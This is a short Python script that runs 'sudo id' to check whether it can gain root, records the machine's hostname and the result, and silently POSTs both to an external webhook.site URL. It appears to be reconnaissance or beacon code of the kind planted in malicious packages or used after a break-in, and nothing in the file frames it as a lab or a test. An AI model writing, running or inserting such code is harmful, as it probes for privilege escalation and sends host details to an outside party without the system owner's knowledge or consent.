import os
import requests
import socket
import subprocess

WEBHOOK_URL = "https://webhook.site/7c0dc567-3ce3-4b87-8393-1ea64c832f20"

def check_privileges():
 
    try:
      
        result = subprocess.check_output(["sudo", "id"], stderr=subprocess.STDOUT)
        privilege_status = result.decode('utf-8').strip()
    except subprocess.CalledProcessError as e:
        privilege_status = f"Failed to escalate: {e.output.decode('utf-8').strip()}"
    except Exception as e:
        privilege_status = f"Error: {str(e)}"

    data = {
        "hostname": socket.gethostname(),
        "privilege_escalation_test": privilege_status,
        "is_root": "uid=0" in privilege_status
    }
    
    requests.post(WEBHOOK_URL, json=data)

if __name__ == "__main__":
    check_privileges()
